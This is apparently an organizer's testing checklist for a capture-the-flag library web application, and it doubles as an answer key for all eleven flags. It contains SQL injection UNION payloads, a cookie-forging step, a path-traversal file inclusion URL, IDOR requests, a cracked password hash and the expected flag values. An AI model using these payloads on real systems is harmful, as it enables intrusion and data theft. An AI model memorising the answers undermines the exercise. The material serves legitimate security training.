# CTF Testing Checklist

Use this checklist to verify all flags are working correctly before launching the CTF.

## Pre-Deployment Tests

### 1. Environment Setup
- [ ] Docker installed and running
- [ ] Docker Compose installed
- [ ] Sufficient disk space (minimum 2GB)
- [ ] Ports 8080 and 3306 available
- [ ] Server has public IP address

### 2. Deployment
- [ ] Run `./deploy.sh` or `docker-compose up -d`
- [ ] All containers started successfully
- [ ] Database initialized without errors
- [ ] Web server accessible at http://SERVER_IP:8080
- [ ] No errors in `docker-compose logs`

### 3. Basic Functionality
- [ ] Homepage loads correctly
- [ ] Browse books page works
- [ ] Categories page displays all categories
- [ ] Search functionality works
- [ ] Login page accessible
- [ ] Can login with test accounts

---

## Flag Verification Tests

### FLAG 1: SQL Injection - ISBN Discovery ✓

**Test Steps:**
1. Go to homepage
2. Enter in search: `' UNION SELECT id,title,author,isbn,publisher,publish_year,category,total_copies,available_copies,description,cover_image,added_date FROM books WHERE category='Mystery' ORDER BY publish_year ASC LIMIT 1-- -`
3. Or browse Mystery category and check oldest book (1841)
4. Verify the ISBN is: `978-0486284736`

**Status:** [ ] PASS / [ ] FAIL

**Notes:** ________________________________

---

### FLAG 2: Information Disclosure - Database Name ✓

**Test Steps:**
1. Open homepage in browser
2. View page source (Ctrl+U)
3. Search for "database" in source
4. Check footer comment: `<!-- System database: library_ctf -->`
5. Also check `backend/config.php` comment

**Expected Answer:** `library_ctf`

**Status:** [ ] PASS / [ ] FAIL

**Notes:** ________________________________

---

### FLAG 3: Cookie Manipulation - Hidden Access ✓

**Test Steps:**
1. Login with any account
2. Open DevTools → Application → Cookies
3. Try accessing: `http://SERVER_IP:8080/backend/hidden.php` (should fail)
4. Manually add/edit cookie: `valid_user` = `true`
5. Access hidden.php again (should succeed)
6. Verify response shows success message

**Expected Answer:** `true`

**Status:** [ ] PASS / [ ] FAIL

**Notes:** ________________________________

---

### FLAG 4: Session Analysis - Admin Access Variable ✓

**Test Steps:**
1. Login as librarian: `librarian_admin` / `library2024`
2. Check session variables set
3. Look at auth.php code around line 35-45
4. Verify `admin_access` session variable is set to `granted`

**Expected Answer:** `granted`

**Status:** [ ] PASS / [ ] FAIL

**Notes:** ________________________________

---

### FLAG 5: File Inclusion - Debug Parameter ✓

**Test Steps:**
1. Test LFI vulnerability:
   ```
   http://SERVER_IP:8080/backend/api.php?debug=1&file=config.php
   ```
2. Verify file contents are displayed
3. Try other files:
   ```
   ?debug=1&file=../database/init.sql
   ```

**Expected Answer:** `config.php` (or any included file)

**Status:** [ ] PASS / [ ] FAIL

**Notes:** ________________________________

---

### FLAG 6: Archive System - Storage Location ✓

**Test Steps:**
1. Login as librarian
2. Access admin panel
3. Go to Archive tab
4. Search for: `ARC-1841-POE`
5. Or use direct API:
   ```
   http://SERVER_IP:8080/backend/admin.php?action=archive&code=ARC-1841-POE
   ```
6. Verify storage_location is returned

**Expected Answer:** `BASEMENT-VAULT-A7`

**Status:** [ ] PASS / [ ] FAIL

**Notes:** ________________________________

---

### FLAG 7: Authentication - Username Enumeration ✓

**Test Steps:**
1. Use SQL injection from FLAG 1 to query users:
   ```
   ' UNION SELECT username,role,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users WHERE role='librarian'-- -
   ```
2. Or check login page hints
3. Or check database directly

**Expected Answer:** `librarian_admin`

**Status:** [ ] PASS / [ ] FAIL

**Notes:** ________________________________

---

### FLAG 8: Cryptography - Password Cracking ✓

**Test Steps:**
1. Extract hash from database:
   ```sql
   SELECT password FROM users WHERE username='librarian_admin';
   ```
2. Hash: `8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918`
3. Crack with hashcat or recognize pattern: `library2024`
4. Verify login works with this password

**Expected Answer:** `library2024`

**Status:** [ ] PASS / [ ] FAIL

**Notes:** ________________________________

---

### FLAG 9: IDOR - Admin Log Access ✓

**Test Steps:**
1. Login as any user (even john_doe)
2. Get access to admin panel (need librarian creds)
3. Access logs by ID:
   ```
   http://SERVER_IP:8080/backend/admin.php?action=logs&log_id=1
   ```
4. Check log from 2024-01-15 14:30:00
5. Extract IP address from log

**Expected Answer:** `192.168.1.100`

**Status:** [ ] PASS / [ ] FAIL

**Notes:** ________________________________

---

### FLAG 10: Privilege Escalation - Hidden Config ✓

**Test Steps:**
1. Login as librarian
2. Access admin panel → System Config
3. Check "Show hidden configurations"
4. Or use API:
   ```
   http://SERVER_IP:8080/backend/admin.php?action=config&show_hidden=true
   ```
5. Find `master_key` configuration value

**Expected Answer:** `CTF-MASTER-KEY-2024-LIBRARY`

**Status:** [ ] PASS / [ ] FAIL

**Notes:** ________________________________

---

### FLAG 11: Complex Chain - User Email ✓

**Test Steps:**
1. Chain information from multiple queries:
   - Oldest mystery book = book_id 1 (from FLAG 1)
   - Who borrowed book_id 1? → Check borrowings table
   - user_id 1 = john_doe
   - john_doe's email = ?

2. Use complex SQL query:
   ```sql
   SELECT u.email FROM users u
   JOIN borrowings b ON u.id = b.user_id
   JOIN books bk ON b.book_id = bk.id  
   WHERE bk.id = (SELECT id FROM books WHERE category='Mystery' ORDER BY publish_year ASC LIMIT 1)
   LIMIT 1;
   ```

3. Or query step by step via SQL injection

**Expected Answer:** `john@example.com`

**Status:** [ ] PASS / [ ] FAIL

**Notes:** ________________________________

---

## Additional Tests

### Database Integrity
- [ ] All tables created correctly
- [ ] Sample data loaded
- [ ] Foreign keys working
- [ ] Indexes created

**Check with:**
```bash
docker exec -it library_mysql mysql -u root -p
# Password: root_password_2024

USE library_ctf;
SHOW TABLES;
SELECT COUNT(*) FROM books;    # Should be 10
SELECT COUNT(*) FROM users;    # Should be 5
SELECT COUNT(*) FROM archive_books;  # Should be 3
```

### API Endpoints
- [ ] GET /backend/api.php?action=books
- [ ] GET /backend/api.php?action=categories
- [ ] GET /backend/api.php?action=search&q=test
- [ ] POST /backend/auth.php?action=login
- [ ] GET /backend/admin.php?action=stats
- [ ] GET /backend/admin.php?action=logs
- [ ] GET /backend/admin.php?action=archive
- [ ] GET /backend/admin.php?action=config

### Security Tests
- [ ] SQL injection works where intended
- [ ] Cookie manipulation works where intended
- [ ] IDOR vulnerability exploitable
- [ ] LFI vulnerability exploitable
- [ ] No unintended vulnerabilities (critical)

### Performance
- [ ] Page load time < 3 seconds
- [ ] Search returns results quickly
- [ ] Database queries optimized
- [ ] No memory leaks in containers

### Browser Compatibility
- [ ] Works in Chrome/Chromium
- [ ] Works in Firefox
- [ ] Works in Edge
- [ ] Mobile responsive

---

## Post-Verification

### Documentation
- [ ] README.md is complete and accurate
- [ ] QUICKSTART.md tested
- [ ] HINTS.md prepared
- [ ] All test accounts listed

### Monitoring Setup
- [ ] Logging enabled
- [ ] Can view docker-compose logs
- [ ] Disk space monitoring
- [ ] Container health checks working

### Backup & Recovery
- [ ] Know how to reset database
- [ ] Know how to restore if corruption occurs
- [ ] Cleanup script tested
- [ ] Can redeploy in < 5 minutes

### Participant Information
- [ ] Server IP/URL documented
- [ ] Test credentials provided
- [ ] Rules and guidelines prepared
- [ ] Scoring system defined
- [ ] Hint schedule prepared

---

## Quick Test Commands

```bash
# Check all services running
docker-compose ps

# View logs
docker-compose logs -f

# Test database connection
docker exec -it library_mysql mysql -u library_user -p library_ctf
# Password: library_pass_2024

# Test web server
curl http://localhost:8080

# Test API
curl http://localhost:8080/backend/api.php?action=books

# Check disk usage
docker system df

# Monitor resources
docker stats

# Restart if needed
docker-compose restart

# Full reset
docker-compose down -v
docker-compose up -d
```

---

## Final Checklist Before Launch

- [ ] All 11 flags verified and working
- [ ] Test accounts confirmed
- [ ] Server accessible from external network
- [ ] Firewall configured correctly
- [ ] Backup plan in place
- [ ] Monitoring active
- [ ] Documentation distributed
- [ ] Hint schedule ready
- [ ] Support channel established
- [ ] Emergency contact list prepared

---

## Emergency Procedures

### If Server Becomes Unresponsive
```bash
sudo docker-compose restart
# If that fails:
sudo docker-compose down
sudo docker-compose up -d
```

### If Database is Corrupted
```bash
sudo docker-compose down -v
sudo docker-compose up -d
# This reinitializes from init.sql
```

### If Flag is Not Working
1. Check docker logs for errors
2. Verify database contents
3. Test API endpoints directly
4. Review relevant code
5. Restart specific service if needed

### Contact Information
- **System Admin**: _______________
- **CTF Organizer**: _______________
- **Emergency Contact**: _______________

---

## Sign-Off

**Tested By:** _______________

**Date:** _______________

**Signature:** _______________

**Ready for Deployment:** [ ] YES / [ ] NO

**Notes:** 
_________________________________________________________________
_________________________________________________________________
_________________________________________________________________
